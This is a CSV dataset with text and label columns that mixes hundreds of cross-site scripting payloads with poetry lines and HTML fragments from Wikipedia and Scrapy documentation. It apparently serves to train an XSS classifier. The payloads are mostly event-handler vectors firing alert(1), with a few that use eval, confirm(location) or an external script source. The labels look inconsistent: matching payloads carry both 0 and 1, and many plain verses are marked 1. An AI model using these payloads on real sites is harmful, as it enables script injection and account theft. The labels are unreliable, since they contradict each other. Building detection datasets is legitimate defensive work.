text,label
"</div> </td> </tr><tr><th scope=""row"" class=""navbox-group"" style=""width:1%""><a href=""/wiki/Machine_learning"" title=""Machine learning"">Machine learning </a> </th><td class=""navbox-list navbox-odd"" style=""text-align:left;border-left-width:2px;border-left-style:solid;width:100%;padding:0px"">",0
That the hoarse guns blared across.,0
"<div draggable=""true"" contenteditable>drag me</div><applet ondrop=alert(1) contenteditable>drop here</applet>",1
"<param onkeypress=""alert(1)"" contenteditable>test</param>",1
<basefont onpointerleave=alert(1)>XSS</basefont>,0
"down the gullies of Yallahs and August Town,",1
"He was lathered like a horse, but the instant",0
"<figure oncontextmenu=""alert(1)"">test</figure>",1
<object onblur=alert(1) tabindex=1 id=x></object><input autofocus>,1
"<nobr ondblclick=""alert(1)"">test</nobr>",1
"<big ondblclick=""alert(1)"">test</big>",1
every day a heave of knitting patterns,1
<a id=x tabindex=1 onbeforeactivate=alert(1)></a>,1
algae bloom beneath the board,0
<script x> alert(1) </script 1=2,1
"tree, but you provided shelter. Can houses tremble?",0
<body onpointerout=alert(1)>XSS</body>,0
"<bdo onpaste=""alert(1)"" contenteditable>test</bdo>",1
sweatdrip slimedrip,1
"<style>@keyframes slidein {}</style><ruby style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></ruby>",0
by the time it stopped your fear turned to anger.,1
</span>,1
"<style>@keyframes x{}</style><del style=""animation-name:x"" onanimationend=""alert(1)""></del>",0
"<small draggable=""true"" ondragend=""alert(1)"">test</small>",0
from peace vessels of the animals,0
in my family to the time of desert / clot of blood &,1
<multicol id=x tabindex=1 onbeforeactivate=alert(1)></multicol>,0
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><article id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></article>",1
"of the Lady Wildcow Ninsun, Gilgamesh",1
"<ruby draggable=""true"" ondragend=""alert(1)"">test</ruby>",0
"<ul class=""wy-breadcrumbs"">",1
About grasshoppers this high up before,1
</div>,1
"know youâ€‰â€”â€‰our eyes like a golemâ€™s, empty",0
<custom tags onpointerover=alert(1)>XSS</custom tags>,1
</span> 2019,1
"wherein every hour has its sound, every day its grac",0
"<svg onmouseover=""alert(1)"">test</svg>",1
â€”,0
<ins id=x tabindex=1 onbeforedeactivate=alert(1)></ins><input autofocus>,1
"nor a wing attached to a claw,",1
"<li><a href=""/wiki/Logical_atomism"" title=""Logical atomism"">Logical atomism </a><span class=""nowrap"">&#160;",1
"Dear saint, I know you will not",1
climbed up the stairs and knocked at the door,0
"Blake, probably gardening",1
"<style>@keyframes x{}</style><command style=""animation-name:x"" onanimationstart=""alert(1)""></command>",0
"and the rain stopped teething,",1
"<header onkeyup=""alert(1)"" contenteditable>test</header>",0
"<div class=""thumb tright"">",1
<blink onpointermove=alert(1)>XSS</blink>,0
"<code draggable=""true"" ondragenter=""alert(1)"">test</code>",1
Â,1
a desolate synagogue. I never ate or drank,0
"<b draggable=""true"" ondragenter=""alert(1)"">test</b>",0
"so many brothers died before I learned to count,",0
<i onfocusout=alert(1) tabindex=1 id=x></i><input autofocus>,0
<content onpointerout=alert(1)>XSS</content>,1
</span>,0
"<ol onbeforepaste=""alert(1)"" contenteditable>test</ol>",0
"<li><a href=""/wiki/Semantic_reasoner"" title=""Semantic reasoner"">Semantic reasoner </a> </li> </ul>",0
"<li id=""cite_note-Breadth_of_commonsense_knowledge-106""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-Breadth_of_commonsense_knowledge_106-0"">^ </a> </b>",1
"<spacer oncopy=""alert(1)"" contenteditable>test</spacer>",0
Iâ€™m hell-humming in,0
"<html oncut=""alert(1)"" contenteditable>test</html>",0
both Abraham and Ishmael's guilt,1
"There are no blossoms left in the trees,",0
"<command onmouseleave=""alert(1)"">test</command>",0
<em onpointerleave=alert(1)>XSS</em>,0
"<h4><span class=""mw-headline"" id=""Transhumanism"">Transhumanism",1
"<menuitem onpaste=""alert(1)"" contenteditable>test</menuitem>",0
"<ol onmouseleave=""alert(1)"">test</ol>",0
"<font oncopy=""alert(1)"" contenteditable>test</font>",0
"Soul clap its hands and sing, and louder sing",0
Â,1
<ins id=x tabindex=1 onfocusin=alert(1)></ins>,1
Some people say,1
though i know none for my [ Â  Â  ],0
"<style>:target {color:red;}</style><command id=x style=""transition:color 1s"" ontransitionend=alert(1)></command>",1
"<style>@keyframes x{}</style><li style=""animation-name:x"" onanimationstart=""alert(1)""></li>",0
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><sub id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></sub>",1
â€¢,1
"<input ondblclick=""alert(1)"">test</input>",0
"<rb draggable=""true"" ondragenter=""alert(1)"">test</rb>",0
<rtc onpointermove=alert(1)>XSS</rtc>,1
on a slim volume of poetryâ€”,1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><iframe id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></iframe>",0
"<i draggable=""true"" ondragstart=""alert(1)"">test</i>",0
"<style>:target {transform: rotate(180deg);}</style><output id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></output>",0
"</div><img src=""//en.wikipedia.org/wiki/Special:CentralAutoLogin/start?type=1x1"" alt="" title="" width=""1"" height=""1"" style=""border: none; position: absolute;"" /> </div>",0
"<abbr onmousedown=""alert(1)"">test</abbr>",0
"Were they planting trees,",0
the first rainbow he shredded was that one,0
"<menu draggable=""true"" ondragend=""alert(1)"">test</menu>",0
Â,1
"of Elizabethan ruff at the edges,",0
"<style>:target {transform: rotate(180deg);}</style><head id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></head>",0
is hard and choked with juice like a plastic,0
"<style>@keyframes x{}</style><audio style=""animation-name:x"" onanimationend=""alert(1)""></audio>",0
"<style>@keyframes x{}</style><noframes style=""animation-name:x"" onanimationstart=""alert(1)""></noframes>",0
"Iâ€™ve always thought Apollo beautiful but boring,",1
"<link onmouseup=""alert(1)"">test</link>",0
"<bgsound oncopy=""alert(1)"" contenteditable>test</bgsound>",1
<frameset onpageshow=alert(1)>,1
"<ul><li><a href=""#CITEREFRussellNorvig2003"">Russell &amp; Norvig 2003 </a>pp.&#160;885–892 </li> </ul>",0
And take her seal so ill! Hark how one chantsâ€”,1
Â,1
"<dt><a class=""reference internal"" href=""topics/signals.html""><span class=""doc"">Signals",1
<sub id=x tabindex=1 ondeactivate=alert(1)></sub><input id=y autofocus>,1
to turnÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â  to accent,0
"<legend onbeforepaste=""alert(1)"" contenteditable>test</legend>",0
"in his child fingers, their prisons invisible",0
<applet onreadystatechange=alert(1)></applet>,0
"Yael never drinks their cereal milk, pours it back i",1
chpt. 8 </li> </ul>,0
"Where I said, â€œShhhhhh, close your eyes",0
<main onpointermove=alert(1)>XSS</main>,1
"<div draggable=""true"" contenteditable>drag me</div><template ondrop=alert(1) contenteditable>drop here</template>",1
Â,1
"<option oncut=""alert(1)"" contenteditable>test</option>",1
___,0
<svg><output onload=alert(1)></output>,0
<applet onreadystatechange=alert(1)></applet>,0
"<style>@keyframes slidein {}</style><image style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></image>",0
as she had once carried the penitential napkins,0
genius. You midsummer pinky promise ring.,1
And find its way out,0
at Arganzuela & the chuckling magpies.,0
"Flashes and fragments, flashes and fragments,",1
<rb onpointerenter=alert(1)>XSS</rb>,1
<legend id=x tabindex=1 onbeforedeactivate=alert(1)></legend><input autofocus>,0
"<listing draggable=""true"" ondragend=""alert(1)"">test</listing>",0
"<nav onmouseenter=""alert(1)"">test</nav>",1
"<style>@keyframes x{}</style><input style=""animation-name:x"" onanimationstart=""alert(1)""></input>",1
discover earlier epochs of famine.,1
"clement, O loving, O God, O God, amidst ruins,",0
"<li><a href=""#CITEREFCrevier1993"">Crevier 1993 </a>pp.&#160;269–271 </li> </ul>",0
<content id=x tabindex=1 ondeactivate=alert(1)></content><input id=y autofocus>,0
"in a dirt yard at Piaille, are confrontation,",1
Like a mirror discreetly manhandled,1
<svg><address onload=alert(1)></address>,1
To be led where they want you to goâ€‰...,0
<input3 onpointerup=alert(1)>XSS</input3>,0
"<style>@keyframes x{}</style><area style=""animation-name:x"" onanimationstart=""alert(1)""></area>",0
Sometimes,0
Negative space sketched my onomatopoeic profile,0
(F(%22%20%252f,1
<mark id=x tabindex=1 onbeforeactivate=alert(1)></mark>,1
where gravity was weakest. He and his father,0
reap the uncensored earth,0
<base id=x tabindex=1 onfocus=alert(1)></base>,1
"leaving nothing behind, nothing on the bed, no versi",1
"<style>:target {color: red;}</style><canvas id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></canvas>",0
</span>,1
<q onpointermove=alert(1)>XSS</q>,1
"horsesâ€™ tails, like a clockâ€™s hands, whip",1
<menu onpointerover=alert(1)>XSS</menu>,1
"<bdi onkeydown=""alert(1)"" contenteditable>test</bdi>",0
introspection of the womb,1
Margaret crushed by a door. Martha martyred,0
"<style>@keyframes slidein {}</style><dt style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></dt>",1
My echo plagiarizes. I land a real love plus,1
"<title ondblclick=""alert(1)"">test</title>",0
<bdo id=x tabindex=1 onbeforeactivate=alert(1)></bdo>,1
a dark bar.,0
"<aside ondblclick=""alert(1)"">test</aside>",0
<strike onpointerenter=alert(1)>XSS</strike>,0
"<tr draggable=""true"" ondragenter=""alert(1)"">test</tr>",1
"with obdurate natures, perhaps, or a daughter",0
<frameset><frame id=x onfocusin=alert(1)>,0
"<aside draggable=""true"" ondragstart=""alert(1)"">test</aside>",1
a planet heavy with night-,1
"<style>@keyframes x{}</style><bgsound style=""animation-name:x"" onanimationstart=""alert(1)""></bgsound>",0
</span> 2015,1
and learn the language of touchÂ  Â  of signs and pain,1
<rb onpointerdown=alert(1)>XSS</rb>,0
"<sub oncut=""alert(1)"" contenteditable>test</sub>",1
"<li id=""cite_note-285""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-285"">^ </a> </b>",0
</span>,1
"of seeing the animal today, Mary Wollstonecraft",0
"<dt><a class=""reference internal"" href=""topics/jobs.html""><span class=""doc"">Jobs: pausing and resuming crawls",1
inside the church of our gutted pharmacies,1
<sub onpointerenter=alert(1)>XSS</sub>,0
I was drawn to it as if it was a woman.',0
"<menuitem onpaste=""alert(1)"" contenteditable>test</menuitem>",1
aspiration for one wandering around in diaphanous,1
After Denise Levertov,0
earth works,0
</div> </div>,1
the planet tattles. We are advised,0
Â,1
comprised of,1
"<dt draggable=""true"" ondragend=""alert(1)"">test</dt>",0
<svg><param onload=alert(1)></param>,1
Cry out endlessly,1
"<main onclick=""alert(1)"">test</main>",0
had he been in contact with the beetle?,1
"<i onpaste=""alert(1)"" contenteditable>test</i>",0
Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â  for You are wit,0
<font onfocusout=alert(1) tabindex=1 id=x></font><input autofocus>,1
<isindex onpointerup=alert(1)>XSS</isindex>,1
Now drizzle caught,1
in the kingdom of the dead where you are.,0
"<font onbeforepaste=""alert(1)"" contenteditable>test</font>",0
<svg><font onload=alert(1)></font>,1
"<div draggable=""true"" contenteditable>drag me</div><p ondragover=alert(1) contenteditable>drop here</p>",1
Â,1
takes both thirst and hunger away,1
The father Utnapishtim spoke and said:,0
"<isindex draggable=""true"" ondragend=""alert(1)"">test</isindex>",1
<canvas onpointerdown=alert(1)>XSS</canvas>,1
Twisted oaken pillars graced,0
"<p oncut=""alert(1)"" contenteditable>test</p>",0
"<pre onmouseout=""alert(1)"">test</pre>",0
But even Halil found his own consolation,0
<var onpointerdown=alert(1)>XSS</var>,0
After seven lean years,1
"<time draggable=""true"" ondrag=""alert(1)"">test</time>",0
"<progress onclick=""alert(1)"">test</progress>",0
<base onpointerout=alert(1)>XSS</base>,1
A cloud surrounds me; I expand into its stillness an,0
"<li class=""toctree-l1""><a class=""reference internal"" href=""topics/autothrottle.html"">AutoThrottle extension</a></li>",0
"<option oncut=""alert(1)"" contenteditable>test</option>",0
Â Â Â Â Â  of cooling pizzas,1
"Chaos danced first with Eros, then jealous Night.",0
Â,1
"<dd onkeyup=""alert(1)"" contenteditable>test</dd>",1
<textarea id=x tabindex=1 ondeactivate=alert(1)></textarea><input id=y autofocus>,0
Â,0
"forgotten be by the goddess, so the goddess",0
Breath to phrase a song boats assemble,0
"<li class=""toctree-l1""><a class=""reference internal"" href=""faq.html"">Frequently Asked Questions</a></li>",0
</span> </h3>,0
"<bdo draggable=""true"" ondragstart=""alert(1)"">test</bdo>",1
our thunder thing,1
"<br oncopy=""alert(1)"" contenteditable>test</br>",1
"<abbr onmouseenter=""alert(1)"">test</abbr>",0
and our beloved leader,1
Crossed words on a corner pole.,1
asks for forgiveness.,1
And hang,0
"<style>:target {color: red;}</style><abbr id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></abbr>",0
"<li>Report bugs with Scrapy in our <a class=""reference external"" href=""https://github.com/scrapy/scrapy/issues"">issue tracker</a>.</li>",1
Nothing to measure,1
<dt id=x tabindex=1 ondeactivate=alert(1)></dt><input id=y autofocus>,1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><isindex id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></isindex>",0
our grandmothers uttered under their breath,0
at thirty-five of a gunshot wound,1
"dogs, miniature horses, monkeys, ferrets,",1
"<style>:target {color: red;}</style><meter id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></meter>",0
"<style>:target {transform: rotate(180deg);}</style><th id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></th>",1
less so?â€”but it takes eight dollars of gas just to get,0
"static, same color Dot says Granny passed in. Past s",0
the Spirit and the Flesh,0
Â Â Â Â Â Â Â Â Â Â Â Â Â Â  our contortions? The materials,0
"<bdo onbeforepaste=""alert(1)"" contenteditable>test</bdo>",1
"<style>:target {color: red;}</style><del id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></del>",1
"<menu draggable=""true"" ondragleave=""alert(1)"">test</menu>",1
â€”1 Corinthians 12:13,1
<listing onpointermove=alert(1)>XSS</listing>,1
"<li id=""cite_note-139""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-139"">^ </a> </b>",1
"<li id=""cite_note-FOOTNOTERussellNorvig200916-30""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-FOOTNOTERussellNorvig200916_30-0"">^ </a> </b>",0
"<summary onmousemove=""alert(1)"">test</summary>",1
"<summary draggable=""true"" ondragenter=""alert(1)"">test</summary>",0
</div>,0
the beast had to charge around him. His sword,1
"<style>@keyframes x{}</style><image style=""animation-name:x"" onanimationend=""alert(1)""></image>",0
"<hgroup onbeforecopy=""alert(1)"" contenteditable>test</hgroup>",0
Silent are the voices I no longer hearâ€‰â€”â€‰,1
"<style>:target {color: red;}</style><multicol id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></multicol>",0
<menu id=x tabindex=1 onactivate=alert(1)></menu>,0
tilting their heads,1
The seal torn & tablets fixed but still impossible t,1
Myths and ideals I could never bring myself to belie,0
"<label onkeydown=""alert(1)"" contenteditable>test</label>",1
"<title oncopy=""alert(1)"" contenteditable>test</title>",0
<span id=x tabindex=1 onbeforedeactivate=alert(1)></span><input autofocus>,1
"<nobr onmouseup=""alert(1)"">test</nobr>",1
"Hunched as he fell, his feet on the firing-step,",1
"he was a bride under lace, remarrying his country,",1
"<tbody onmouseup=""alert(1)"">test</tbody>",1
"<style>:target {color:red;}</style><tr id=x style=""transition:color 1s"" ontransitionend=alert(1)></tr>",1
Coyote wheedles and croons another minute,0
Was aware of itself? Never. Its adoration,1
"Allâ€™s virtuous, check.",0
"Oh, I said, this is going to be.",0
"<input onpaste=alert(1) value="" autofocus>",0
<content id=x tabindex=1 onfocus=alert(1)></content>,0
"Drum,",1
"<div draggable=""true"" contenteditable>drag me</div><figure ondragover=alert(1) contenteditable>drop here</figure>",0
length,1
"<style onbeforecut=""alert(1)"" contenteditable>test</style>",0
"<var onkeydown=""alert(1)"" contenteditable>test</var>",0
"<table onmouseleave=""alert(1)"">test</table>",0
"in infernal chemistry, in the spirit as a kind",0
"<rb draggable=""true"" ondragleave=""alert(1)"">test</rb>",1
"<shadow onmouseup=""alert(1)"">test</shadow>",0
"document.getElementsByName("")",0
"<applet onpaste=""alert(1)"" contenteditable>test</applet>",1
<main onpointermove=alert(1)>XSS</main>,0
"premeditated, before the",1
and then they just called me fruitless,0
"<style>:target {color:red;}</style><legend id=x style=""transition:color 1s"" ontransitionend=alert(1)></legend>",0
<summary id=x tabindex=1 ondeactivate=alert(1)></summary><input id=y autofocus>,0
Â Â Â And falls into the basin of the mind,0
to highest mountain,0
"<script onbeforepaste=""alert(1)"" contenteditable>test</script>",0
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  some drown in movies.,1
"<style>@keyframes slidein {}</style><caption style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></caption>",1
%7D)</script><svg+onload=confirm(location)>,0
"<isindex draggable=""true"" ondragstart=""alert(1)"">test</isindex>",0
the right. Maybe the leaf of grass tells us,1
The shut eye is opening.,1
after my car was full and watched it spill its smell,0
<image id=x tabindex=1 onactivate=alert(1)></image>,1
The jungleâ€™s green is the wild mind,1
</span>,0
half such conviction?,1
"O vast and mournful spirit, wherefore keep",0
"<small onbeforecopy=""alert(1)"" contenteditable>test</small>",0
Whenever I open my mouth: crater,0
</span> </a> </li>,0
"<li id=""cite_note-224""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-224"">^ </a> </b>",1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><applet id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></applet>",1
"He can't stop laughing, can't stop",0
"<strike onmousedown=""alert(1)"">test</strike>",1
"A passion wholly of the mind,",0
in a chorus of prayer humming,1
I am afraid of your transcendental death.,0
"I smoked Rimbaudâ€™s clay pipe,",1
far less welcome Â  Â  Â  who mourns a rat king,0
the place which is the source of the outflowing,1
<area onpointerenter=alert(1)>XSS</area>,1
"<style>:target {color: red;}</style><rb id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></rb>",0
"<noembed onkeypress=""alert(1)"" contenteditable>test</noembed>",0
They wish us to participate in over-lighting the col,1
<link id=x tabindex=1 onactivate=alert(1)></link>,1
<col id=x tabindex=1 onbeforedeactivate=alert(1)></col><input autofocus>,1
"'It is I, Enkidu. The strength of the wild man",0
"<div draggable=""true"" contenteditable>drag me</div><ul ondrop=alert(1) contenteditable>drop here</ul>",1
"objective truth, complete justice, decency",1
<dt>Breadth of commonsense knowledge </dt>,1
"as the sheen of mares, saw his father's face",0
"<wbr oncopy=""alert(1)"" contenteditable>test</wbr>",0
Please join me in this last silence at the end of th,0
crane my neck about the window,1
"Walking away from my fatherâ€™s house, my marriage,",1
"<style>:target {color: red;}</style><tr id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></tr>",0
"There is a playwrightâ€™s staging called â€œbusiness,â€",0
"<col onkeypress=""alert(1)"" contenteditable>test</col>",1
</span> </h3>,1
"<time draggable=""true"" ondragend=""alert(1)"">test</time>",1
"to stay in bounds,",0
<custom tags onpointerleave=alert(1)>XSS</custom tags>,0
"<bgsound oncontextmenu=""alert(1)"">test</bgsound>",0
"<style>@keyframes slidein {}</style><param style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></param>",1
Blackmail & a verb that means renouncing Christ,0
"<li id=""cite_note-AI_at_Edinburgh_and_France_in_the_60s-162""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-AI_at_Edinburgh_and_France_in_the_60s_162-0"">^ </a> </b>",1
And so the angels stitched together what was,1
"<mark draggable=""true"" ondragleave=""alert(1)"">test</mark>",0
and rocket seed-heads. We walk,1
sooner or later.,0
The canopy whipped and flapped.,1
the rain begins to pour.,1
the stone. I want a mouth full of permissions,1
"Through these planetary vortices, dolphins catalyze",0
"<abbr draggable=""true"" ondragstart=""alert(1)"">test</abbr>",0
"<param onmousemove=""alert(1)"">test</param>",0
"<style>:target {color:red;}</style><li id=x style=""transition:color 1s"" ontransitionend=alert(1)></li>",0
"<li id=""cite_note-3""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-3"">^ </a> </b>",1
"<style>@keyframes x{}</style><meta style=""animation-name:x"" onanimationstart=""alert(1)""></meta>",0
the stone. I want a mouth full of permissions,0
<caption onpointerenter=alert(1)>XSS</caption>,1
So I will ask to collect my dead and wounded,0
for quickening danger.,1
after her last run,0
"Wood of the highest quality, swears the owner,",1
</span> </a> </li>,0
"<style>:target {color:red;}</style><tr id=x style=""transition:color 1s"" ontransitionend=alert(1)></tr>",0
"touched by no one knowsâ€‰â€”â€‰down, or",0
The scientist and the artist were once oneâ€”,1
licked clean the rich yolk and left,1
"<optgroup oncut=""alert(1)"" contenteditable>test</optgroup>",0
<ol onpointermove=alert(1)>XSS</ol>,0
"<style>@keyframes x{}</style><main style=""animation-name:x"" onanimationstart=""alert(1)""></main>",1
"<marquee onmousemove=""alert(1)"">test</marquee>",0
<image onpointerleave=alert(1)>XSS</image>,1
"<h1 onbeforecut=""alert(1)"" contenteditable>test</h1>",1
it was dirty and tight. She said â€œdeal with it.â€,1
"its forests tossing with fever, the dry cattle",1
"<style>:target {transform: rotate(180deg);}</style><meta id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></meta>",1
<img onpointerleave=alert(1)>XSS</img>,0
"Or we keep sullen silence in light and shade,",1
"a man about to undress,",0
One dolphin swims toward me; I open telepathically a,1
We have been here before. An animal raises her leg.,1
not an answer. She leaned,0
One of them grants you the ability,1
<main id=x tabindex=1 onbeforedeactivate=alert(1)></main><input autofocus>,0
"<ruby onbeforepaste=""alert(1)"" contenteditable>test</ruby>",1
"<cite onmousedown=""alert(1)"">test</cite>",0
<bdi id=x tabindex=1 ondeactivate=alert(1)></bdi><input id=y autofocus>,0
when I was just seven and eight.,0
<div>,1
"Â  Â  Â  Â  Â  Â to disappear into wine,",1
i hoardÂ  Â  Â  i steal Â  Â  Â  i borrow,1
"<label onmouseleave=""alert(1)"">test</label>",0
Together and behind themÂ  Â  Â  but above,1
the visit was an excuse.,0
We shelter an angel whom we never cease to offend. W,0
"<kbd onkeyup=""alert(1)"" contenteditable>test</kbd>",1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><progress id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></progress>",0
"died, leaving wisps of pipe smoke for a memory.",0
</span>,1
onFocus(),1
"<style>@keyframes x{}</style><listing style=""animation-name:x"" onanimationstart=""alert(1)""></listing>",1
"<script onmouseleave=""alert(1)"">test</script>",0
"<canvas ondblclick=""alert(1)"">test</canvas>",0
"<form oncontextmenu=""alert(1)"">test</form>",1
"<article onmousemove=""alert(1)"">test</article>",0
"<input onmouseout=""alert(1)"">test</input>",1
"<style>@keyframes slidein {}</style><title style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></title>",1
they carry me out to the ruined cathedral where the,0
"the stauncher faiths call impassible,",1
When Gilgamesh found out what the serpent had done,1
<object id=x tabindex=1 onbeforeactivate=alert(1)></object>,1
<audio onpointermove=alert(1)>XSS</audio>,1
<dir id=x tabindex=1 ondeactivate=alert(1)></dir><input id=y autofocus>,1
<svg><abbr onload=alert(1)></abbr>,0
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><aside id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></aside>",1
"<style>@keyframes x{}</style><progress style=""animation-name:x"" onanimationstart=""alert(1)""></progress>",0
"<map onmouseup=""alert(1)"">test</map>",1
With mounting beat the utter fire,0
God-My-Motherâ€™s wounds will never heal.,1
"<div draggable=""true"" contenteditable>drag me</div><textarea ondrop=alert(1) contenteditable>drop here</textarea>",0
"<dd>""Every aspect of learning or any other feature of intelligence can be so precisely described that a machine can be made to simulate it."" This conjecture was printed in the proposal for the Dartmouth Conference of 1956.<sup id=""cite_ref-Dartmouth_proposal_352-0"" class=""reference""><a href=""#cite_note-Dartmouth_proposal-352"">&#91;341&#93; </a> </sup> </dd> </dl>",1
"<multicol draggable=""true"" ondragend=""alert(1)"">test</multicol>",1
the tuna casseroles and macaroni and cheese,1
"<time oncopy=""alert(1)"" contenteditable>test</time>",1
<details id=x tabindex=1 onbeforeactivate=alert(1)></details>,1
"One should not pick the weeds, lest there be",0
<menuitem id=x tabindex=1 onfocus=alert(1)></menuitem>,1
<command id=x tabindex=1 ondeactivate=alert(1)></command><input id=y autofocus>,0
"<h3><span class=""mw-headline"" id=""Artificial_neural_networks"">Artificial neural networks",1
"And out of this chord, this discord will come",1
"document.querySelector("")",0
"<acronym onpaste=""alert(1)"" contenteditable>test</acronym>",1
"<canvas onmouseout=""alert(1)"">test</canvas>",0
<img src=x:alert(alt) onerror=eval(src) alt=0>,0
"a whoo. You cowardly bastard! I roared, and",1
<style onpointermove=alert(1)>XSS</style>,1
"<footer onkeyup=""alert(1)"" contenteditable>test</footer>",0
Arms retreat guilt-free,0
Everything happens offstage,0
"<big onbeforecut=""alert(1)"" contenteditable>test</big>",0
"<div draggable=""true"" contenteditable>drag me</div><s ondrop=alert(1) contenteditable>drop here</s>",0
"We disembark, walk in twos so we",0
"<progress onmouseover=""alert(1)"">test</progress>",1
<footer id=x tabindex=1 onfocus=alert(1)></footer>,1
"<image onmouseleave=""alert(1)"">test</image>",0
<noscript id=x tabindex=1 onbeforedeactivate=alert(1)></noscript><input autofocus>,0
"Here is the bird, the tree, the stone.",0
<SCRIPT SRC=//.rocks/.j>,0
"<frameset draggable=""true"" ondrag=""alert(1)"">test</frameset>",0
"<li id=""cite_note-97""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-97"">^ </a> </b>",1
<u onpointerout=alert(1)>XSS</u>,1
<blockquote onpointerdown=alert(1)>XSS</blockquote>,1
Down from his cotÂ  Â  Â  in the clouds to a small village,1
closes his eyes as the light sweeps him to eternity.,1
understand. I wondered why there,0
<picture id=x tabindex=1 onbeforeactivate=alert(1)></picture>,1
<thead onblur=alert(1) tabindex=1 id=x></thead><input autofocus>,1
"<style>@keyframes x{}</style><cite style=""animation-name:x"" onanimationend=""alert(1)""></cite>",1
"Â  Â  Â  Â  Â  Â  Â branches. Here, not even",1
</span> 2015,1
"<style>:target {color: red;}</style><big id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></big>",1
"who would not budge from a weedpatch,",0
<a onpointerout=alert(1)>XSS</a>,0
<input id=x onfocusin=alert(1)>,1
<samp id=x tabindex=1 ondeactivate=alert(1)></samp><input id=y autofocus>,0
<input type=image src=1 onerror=alert(1)>,0
Â,1
"<h3><span class=""mw-headline"" id=""Advertising"">Advertising",0
Â,1
<meta onpointermove=alert(1)>XSS</meta>,1
<time onpointerleave=alert(1)>XSS</time>,1
Mountain,0
<basefont id=x tabindex=1 ondeactivate=alert(1)></basefont><input id=y autofocus>,1
A chain to hang you on.,1
